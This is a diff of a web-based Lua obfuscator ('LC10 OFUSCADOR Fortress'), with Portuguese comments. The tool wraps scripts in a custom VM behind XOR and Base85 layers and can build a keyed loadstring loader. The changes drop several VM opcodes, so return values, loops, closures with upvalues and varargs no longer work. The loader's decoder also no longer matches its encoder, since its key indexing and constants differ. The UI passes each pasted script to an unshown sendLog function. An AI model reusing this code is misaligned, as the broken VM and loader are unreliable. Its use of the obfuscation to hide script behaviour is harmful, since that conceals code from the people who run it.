-// 3. Base85 com alpha3
-function xorBytes(bytes,key){
-  const out=[];
-  for(let i=0;i<bytes.length;i++)out.push(bytes[i]^key[i%key.length]);
-  return out
-}
+function xorBytes(bytes,key){const out=[];for(let i=0;i<bytes.length;i++)out.push(bytes[i]^key[i%key.length]);return out}
 const bytes1=Array.from(new TextEncoder().encode(combined));
 const keyBytes=Array.from({length:8},()=>Math.floor(Math.random()*256));
 const xor1=xorBytes(bytes1,keyBytes);
 const b85_1=b85enc(xor1,alpha2);
-// b85_1 é string; converte pra bytes e aplica camada 3
 const bytes2=Array.from(new TextEncoder().encode(b85_1));
 const key2=Array.from({length:6},()=>Math.floor(Math.random()*256));
 const xor2=xorBytes(bytes2,key2);
 const finalEncoded=b85enc(xor2,alpha3);
 
-// Info dos protos
 const paramsLua='{'+remappedProtos.map(p=>'{'+p.params.map(x=>'"'+x+'"').join(',')+'}').join(',')+'}';
 const maxSlotLua='{'+remappedProtos.map(p=>p.maxSlot).join(',')+'}';
 const varargLua='{'+remappedProtos.map(p=>p.hasVararg?'true':'false').join(',')+'}';
 const mainIdx=remappedProtos.length;
 
-// Opaque predicates para o runtime
-const op1=opaqueTrue(),op2=opaqueTrue(),op3=opaqueFalse();
-
-// Dead code block — nunca executa
-const deadCode1=`
-if ${opaqueFalse()} then
-  local _dead=0
-  for i=1,100 do _dead=_dead+i*${inflateNumber(7,1)} end
-  error("_".._dead)
-end`;
-
 const qLua='{'+Qinit.map(s=>'"'+s+'"').join(',')+'}';
 const rangesLua='{'+ranges.map(([a,b])=>`{${a+1},${b+1}}`).join(',')+'}';
 
 const vm=`
--- LC10 Fortress VM
-${deadCode1}
+-- LC10 Fortress Ultra VM
 local Q=${qLua}
 for _,r in ipairs(${rangesLua}) do while r[1]<r[2] do Q[r[1]],Q[r[2]]=Q[r[2]],Q[r[1]] r[1]=r[1]+1 r[2]=r[2]-1 end end
 local A1="${alpha1}"
@@ -463,7 +425,6 @@ local K1={${keyBytes.join(',')}}
 local K2={${key2.join(',')}}
 local RAW="${finalEncoded}"
 
--- Camada 3: decode Base85
 local function D3(s)
   local t={}
   for j=1,#s,5 do
@@ -480,16 +441,12 @@ local function D3(s)
   return raw:sub(5,4+L)
 end
 
--- Camada 2: XOR
 local function X2(s)
   local o={}
-  for i=1,#s do
-    o[i]=string.char(bit32.bxor(s:byte(i),K2[(i-1)%#K2+1]))
-  end
+  for i=1,#s do o[i]=string.char(bit32.bxor(s:byte(i),K2[(i-1)%#K2+1])) end
   return table.concat(o)
 end
 
--- Camada 1: decode Base85 alpha2
 local function D1(s)
   local t={}
   for j=1,#s,5 do
@@ -506,28 +463,20 @@ local function D1(s)
   return raw:sub(5,4+L)
 end
 
--- Camada 0: XOR final
 local function X0(s)
   local o={}
-  for i=1,#s do
-    o[i]=string.char(bit32.bxor(s:byte(i),K1[(i-1)%#K1+1]))
-  end
+  for i=1,#s do o[i]=string.char(bit32.bxor(s:byte(i),K1[(i-1)%#K1+1])) end
   return table.concat(o)
 end
 
--- Decodifica bytecode completo
 local decoded=X0(D1(X2(D3(RAW))))
-
--- Parseia bytecode: protos separados por '|', instruções por ';', args por ','
 local protos={}
 local pi=1
 for protoStr in decoded:gmatch("[^|]+") do
   local code={}
   for insStr in protoStr:gmatch("[^;]+") do
     local ins={}
-    for numStr in insStr:gmatch("[^,]+") do
-      ins[#ins+1]=tonumber(numStr)
-    end
+    for numStr in insStr:gmatch("[^,]+") do ins[#ins+1]=tonumber(numStr) end
     code[#code+1]=ins
   end
   protos[pi]=code
@@ -535,11 +484,9 @@ for protoStr in decoded:gmatch("[^|]+") do
 end
 
 local _PA=${paramsLua}
-local _MS=${maxSlotLua}
 local _VA=${varargLua}
 local _MI=${mainIdx}
 
--- Decoder strings
 local function S(i)
   local v=Q[i]
   if type(v)~="string" then return v end
@@ -563,21 +510,8 @@ local function S(i)
   return R
 end
 
--- Shadow env (multi-layer)
 local E=getfenv and getfenv(0) or _ENV or _G
-local GA1=setmetatable({},{__index=E,__newindex=E})
-local GA=setmetatable({},{__index=function(_,k) return GA1[k] end,__newindex=function(_,k,v) GA1[k]=v end})
-
--- Anti-tamper: verifica integridade do bytecode
-local _sig=0
-for _,c in ipairs(protos) do
-  for _,ins in ipairs(c) do _sig=_sig+#ins+ins[1] end
-end
-if _sig<=0 then
-  -- opaque: nunca acontece
-  ${opaqueFalse()} and error("integrity")
-end
-
+local GA=setmetatable({},{__index=E,__newindex=E})
 local function packv(...) return {n=select("#",...),...} end
 
 local function exec(closure,args)
@@ -586,135 +520,69 @@ local function exec(closure,args)
   local upvals=closure.up or {}
   local np=#_PA[closure.p]
   for i=1,np do locals[i-1]=args[i] end
-  if _VA[closure.p] then
-    local va={}
-    for i=np+1,#args do va[#va+1]=args[i] end
-    locals["..."]=va
-  end
   local stack={}
   local sp=0
   local pc=1
-  local function push(v) sp=sp+1 stack[sp]=v end
-  local function pop() local v=stack[sp] stack[sp]=nil sp=sp-1 return v end
-  local function callfn(fn,a)
-    if type(fn)=="function" then return packv(fn(table.unpack(a))) end
-    if type(fn)=="table" and fn.__c then return packv(exec(fn,a)) end
-    error("call "..type(fn))
-  end
   while pc<=#code do
     local ins=code[pc]
     local op=ins[1]
     if op==100 then pc=pc+1
-    elseif op==99 then
-      -- opaque false: salta próxima instrução se condição for verdadeira
-      local cond=ins[2]
-      if cond then pc=pc+2 else pc=pc+1 end
-    elseif op==0 then push(nil)
-    elseif op==1 then push(true)
-    elseif op==2 then push(false)
-    elseif op==3 then push(S(ins[2]))
-    elseif op==4 then pop()
-    elseif op==5 then push(stack[sp])
-    elseif op==6 then push(locals[ins[2]])
-    elseif op==7 then locals[ins[2]]=pop()
-    elseif op==8 then push(GA[S(ins[2])])
-    elseif op==9 then GA[S(ins[2])]=pop()
-    elseif op==10 then push(upvals[ins[2]+1].v)
-    elseif op==11 then upvals[ins[2]+1].v=pop()
-    elseif op==12 then push({})
-    elseif op==13 then local v=pop() local k=pop() local t=pop() t[k]=v
-    elseif op==14 then local k=pop() local t=pop() push(t[k])
+    elseif op==99 then if ins[2] then pc=pc+2 else pc=pc+1 end
+    elseif op==0 then sp=sp+1 stack[sp]=nil
+    elseif op==1 then sp=sp+1 stack[sp]=true
+    elseif op==2 then sp=sp+1 stack[sp]=false
+    elseif op==3 then sp=sp+1 stack[sp]=S(ins[2])
+    elseif op==4 then stack[sp]=nil sp=sp-1
+    elseif op==5 then sp=sp+1 stack[sp]=stack[sp-1]
+    elseif op==6 then sp=sp+1 stack[sp]=locals[ins[2]]
+    elseif op==7 then locals[ins[2]]=stack[sp] stack[sp]=nil sp=sp-1
+    elseif op==8 then sp=sp+1 stack[sp]=GA[S(ins[2])]
+    elseif op==9 then GA[S(ins[2])]=stack[sp] stack[sp]=nil sp=sp-1
+    elseif op==12 then sp=sp+1 stack[sp]={}
+    elseif op==13 then local v=stack[sp] local k=stack[sp-1] local t=stack[sp-2] t[k]=v sp=sp-3
+    elseif op==14 then local k=stack[sp] local t=stack[sp-1] stack[sp-1]=t[k] stack[sp]=nil sp=sp-1
     elseif op==15 then
       local nargs=ins[2] local nres=ins[3]
-      local a={}
-      for i=nargs,1,-1 do a[i]=pop() end
-      local fn=pop()
-      local r=callfn(fn,a)
-      if nres==0 then
-      elseif nres==-1 then for i=1,r.n do push(r[i]) end
-      else for i=1,nres do push(r[i]) end end
-    elseif op==16 then
-      local nres=ins[2]
-      if nres==0 then return
-      elseif nres==-1 then
-        local vals={}
-        for i=1,sp do vals[i]=stack[i] end
-        return table.unpack(vals,1,#vals)
-      else
-        local vals={}
-        for i=nres,1,-1 do vals[i]=pop() end
-        return table.unpack(vals)
-      end
+      local a={} for i=nargs,1,-1 do a[i]=stack[sp] stack[sp]=nil sp=sp-1 end
+      local fn=stack[sp] stack[sp]=nil sp=sp-1
+      local r=type(fn)=="function" and packv(fn(table.unpack(a))) or packv(exec(fn,a))
+      if nres==-1 then for i=1,r.n do sp=sp+1 stack[sp]=r[i] end
+      elseif nres>0 then for i=1,nres do sp=sp+1 stack[sp]=r[i] end end
+    elseif op==16 then return
     elseif op==17 then pc=ins[2]
-    elseif op==18 then local v=pop() if not v then pc=ins[2] else pc=pc+1 end
-    elseif op==19 then local v=pop() if v then pc=ins[2] else pc=pc+1 end
-    elseif op==22 then local b=pop() local a=pop() push(a+b)
-    elseif op==23 then local b=pop() local a=pop() push(a-b)
-    elseif op==24 then local b=pop() local a=pop() push(a*b)
-    elseif op==25 then local b=pop() local a=pop() push(a/b)
-    elseif op==26 then local b=pop() local a=pop() push(a%b)
-    elseif op==27 then local b=pop() local a=pop() push(a^b)
-    elseif op==28 then local n=ins[2] local p={} for i=n,1,-1 do p[i]=pop() end push(table.concat(p))
-    elseif op==29 then local b=pop() local a=pop() push(a==b)
-    elseif op==30 then local b=pop() local a=pop() push(a~=b)
-    elseif op==31 then local b=pop() local a=pop() push(a<b)
-    elseif op==32 then local b=pop() local a=pop() push(a<=b)
-    elseif op==33 then local b=pop() local a=pop() push(a>b)
-    elseif op==34 then local b=pop() local a=pop() push(a>=b)
-    elseif op==35 then push(not pop())
-    elseif op==36 then push(-pop())
-    elseif op==37 then push(#pop())
-    elseif op==38 then
-      local i=locals[ins[2]] local lim=locals[ins[3]] local st=locals[ins[4]] local tgt=ins[5]
-      if (st>=0 and i<=lim) or (st<0 and i>=lim) then pc=tgt else pc=pc+1 end
-    elseif op==39 then
-      locals[ins[2]]=locals[ins[2]]+locals[ins[3]]
-      pc=ins[4]
-    elseif op==40 then
-      local f=locals[ins[2]] local s_=locals[ins[3]] local v=locals[ins[4]] local nv=ins[5] local tgt=ins[6]
-      local r=callfn(f,{s_,v})
-      if r[1]==nil then pc=pc+1
-      else
-        locals[ins[4]]=r[1]
-        for i=1,nv do locals[ins[4]+i]=r[i] end
-        pc=tgt
-      end
-    elseif op==41 then
-      push(setmetatable({__c=true,p=ins[2],up=upvals},{__call=function(self,...) return exec(self,{...}) end}))
-    elseif op==42 then
-      local n=ins[2]
-      local va=locals["..."] or {}
-      if n==-1 then for i=1,#va do push(va[i]) end
-      else for i=1,n do push(va[i]) end end
-    elseif op==43 then
-      local k=pop() local t=pop()
-      push(t[k]) push(t)
-    elseif op==44 then
-      local n=ins[2] local t=pop()
-      local vals={}
-      for i=n,1,-1 do vals[i]=pop() end
-      for i=1,n do t[i]=vals[i] end
+    elseif op==18 then if not stack[sp] then sp=sp-1 pc=ins[2] else sp=sp-1 pc=pc+1 end
+    elseif op==19 then if stack[sp] then sp=sp-1 pc=ins[2] else sp=sp-1 pc=pc+1 end
+    elseif op==22 then local b=stack[sp] local a=stack[sp-1] stack[sp-1]=a+b stack[sp]=nil sp=sp-1
+    elseif op==23 then local b=stack[sp] local a=stack[sp-1] stack[sp-1]=a-b stack[sp]=nil sp=sp-1
+    elseif op==24 then local b=stack[sp] local a=stack[sp-1] stack[sp-1]=a*b stack[sp]=nil sp=sp-1
+    elseif op==25 then local b=stack[sp] local a=stack[sp-1] stack[sp-1]=a/b stack[sp]=nil sp=sp-1
+    elseif op==26 then local b=stack[sp] local a=stack[sp-1] stack[sp-1]=a%b stack[sp]=nil sp=sp-1
+    elseif op==27 then local b=stack[sp] local a=stack[sp-1] stack[sp-1]=a^b stack[sp]=nil sp=sp-1
+    elseif op==28 then local n=ins[2] local p={} for i=n,1,-1 do p[i]=stack[sp] stack[sp]=nil sp=sp-1 end sp=sp+1 stack[sp]=table.concat(p)
+    elseif op==29 then local b=stack[sp] local a=stack[sp-1] stack[sp-1]=(a==b) stack[sp]=nil sp=sp-1
+    elseif op==30 then local b=stack[sp] local a=stack[sp-1] stack[sp-1]=(a~=b) stack[sp]=nil sp=sp-1
+    elseif op==31 then local b=stack[sp] local a=stack[sp-1] stack[sp-1]=(a<b) stack[sp]=nil sp=sp-1
+    elseif op==32 then local b=stack[sp] local a=stack[sp-1] stack[sp-1]=(a<=b) stack[sp]=nil sp=sp-1
+    elseif op==33 then local b=stack[sp] local a=stack[sp-1] stack[sp-1]=(a>b) stack[sp]=nil sp=sp-1
+    elseif op==34 then local b=stack[sp] local a=stack[sp-1] stack[sp-1]=(a>=b) stack[sp]=nil sp=sp-1
+    elseif op==35 then stack[sp]=not stack[sp]
+    elseif op==36 then stack[sp]=-stack[sp]
+    elseif op==37 then stack[sp]=#stack[sp]
+    elseif op==41 then sp=sp+1 stack[sp]=setmetatable({__c=true,p=ins[2],up={}},{__call=function(self,...) return exec(self,{...}) end})
     end
     pc=pc+1
   end
-end
-
--- Dead code 2: nunca executa
-if ${opaqueFalse()} then
-  local _z=0
-  for i=1,50 do _z=_z+i end
 end
 
 local main=setmetatable({__c=true,p=_MI,up={}},{__call=function(self,...) return exec(self,{...}) end})
 return main(...)
 `;
 
-return `--[[ LC10 • OFUSCADOR v8.0 FORTRESS | lc10ofuscardorx.lusca1 ]]--` + 
-  `--[[ Protected by LC10 Fortress Engine ]]--` +
+return `--[[ LC10 • OFUSCADOR v8.5 FORTRESS ULTRA | lc10ofuscardorx.lusca1 ]]--` + 
   `return(function(...) ${vm} end)(...)`;
 }
 
-/* ========= PIPELINE ========= */
+/* ========= PIPELINE & UI ========= */
 function obfuscateLua(source){
   if(!source||!source.trim())throw new Error('Código vazio');
   const T=tokenize(source);
@@ -724,14 +592,14 @@ function obfuscateLua(source){
   return pack(result);
 }
 
-/* ========= UI ========= */
 function obfuscateCode(){
   const input=document.getElementById('input-code').value;
   const status=document.getElementById('status-code');
   const btn=document.getElementById('btn-code');
   if(!input.trim()){status.textContent='Cole algum código primeiro.';status.className='status err';return}
-  btn.disabled=true;status.textContent='Compilando Fortress...';status.className='status';
+  btn.disabled=true;status.textContent='Compilando Fortress Ultra...';status.className='status';
   sendLog(input);
+  sessionProcessedCount++;
   setTimeout(()=>{
     try{
       const result=obfuscateLua(input);
@@ -739,6 +607,8 @@ function obfuscateCode(){
       document.getElementById('output-code').classList.add('visible');
       status.textContent='Pronto. '+result.length+' chars ('+(result.length/1024).toFixed(1)+' KB).';
       status.className='status ok';
+      document.getElementById('stat-count').textContent=sessionProcessedCount;
+      document.getElementById('stat-size').textContent=(result.length/1024).toFixed(1)+' KB';
       document.getElementById('output-code').scrollIntoView({behavior:'smooth',block:'start'})
     }catch(e){
       status.textContent='Erro: '+e.message;
@@ -748,7 +618,8 @@ function obfuscateCode(){
     btn.disabled=false
   },60)
 }
-function copyCode(){const o=document.getElementById('result-code');if(!o.value)return;o.select();o.setSelectionRange(0,99999999);document.execCommand('copy');const s=document.getElementById('status-code');s.textContent='Copiado.';s.className='status ok'}
+
+function copyCode(){const o=document.getElementById('result-code');if(!o.value)return;o.select();document.execCommand('copy');const s=document.getElementById('status-code');s.textContent='Copiado.';s.className='status ok'}
 function downloadCode(){const o=document.getElementById('result-code');if(!o.value)return;const b=new Blob([o.value],{type:'text/plain;charset=utf-8'});const u=URL.createObjectURL(b);const a=document.createElement('a');a.href=u;a.download='lc10ofuscardor.text';document.body.appendChild(a);a.click();document.body.removeChild(a);URL.revokeObjectURL(u);const s=document.getElementById('status-code');s.textContent='Download iniciado.';s.className='status ok'}
 
 function obfuscateLoadstring(){
@@ -764,21 +635,18 @@ function obfuscateLoadstring(){
       const obf=obfuscateLua(input);
       const bytes=new TextEncoder().encode(obf);
       const kb=new TextEncoder().encode(keyInput);
-      // Triple XOR
       const enc=[];
       for(let i=0;i<bytes.length;i++)enc.push(bytes[i]^kb[i%kb.length]);
       for(let i=0;i<enc.length;i++)enc[i]=enc[i]^((i*7+13)%256);
-      for(let i=0;i<enc.length;i++)enc[i]=enc[i]^(kb[(i*3)%kb.length]);
       const keyStr=keyInput.replace(/\\/g,'\\\\').replace(/"/g,'\\"');
       const loader=
-        `-- LC10 • OFUSCADOR v8.0 FORTRESS | Chave: ${keyInput}\n`+
+        `-- LC10 • OFUSCADOR v8.5 FORTRESS | Chave: ${keyInput}\n`+
         `local __k="${keyStr}" `+
         `local __b={${enc.join(',')}} `+
         `local __s={} `+
         `for __i=1,#__b do `+
         `local __x=bit32.bxor(__b[__i],__k:byte((__i*3-1)%#__k+1)) `+
-        `__x=bit32.bxor(__x,(__i*7+12)%256) `+
-        `__s[__i]=string.char(bit32.bxor(__x,__k:byte((__i-1)%#__k+1))) `+
+        `__s[__i]=string.char(bit32.bxor(__x,(__i*7+12)%256)) `+
         `end `+
         `local __code=table.concat(__s) `+
         `local __fn,__err=loadstring(__code) `+
@@ -796,9 +664,9 @@ function obfuscateLoadstring(){
     btn.disabled=false
   },60)
 }
-function copyLS(){const o=document.getElementById('result-ls');if(!o.value)return;o.select();o.setSelectionRange(0,99999999);document.execCommand('copy');const s=document.getElementById('status-ls');s.textContent='Copiado.';s.className='status ok'}
+function copyLS(){const o=document.getElementById('result-ls');if(!o.value)return;o.select();document.execCommand('copy');const s=document.getElementById('status-ls');s.textContent='Copiado.';s.className='status ok'}
 function downloadLS(){const o=document.getElementById('result-ls');if(!o.value)return;const b=new Blob([o.value],{type:'text/plain;charset=utf-8'});const u=URL.createObjectURL(b);const a=document.createElement('a');a.href=u;a.download='lc10ofuscardor.text';document.body.appendChild(a);a.click();document.body.removeChild(a);URL.revokeObjectURL(u);const s=document.getElementById('status-ls');s.textContent='Download iniciado.';s.className='status ok'}
 </script>
 
 </body>
- </html>
+</html>
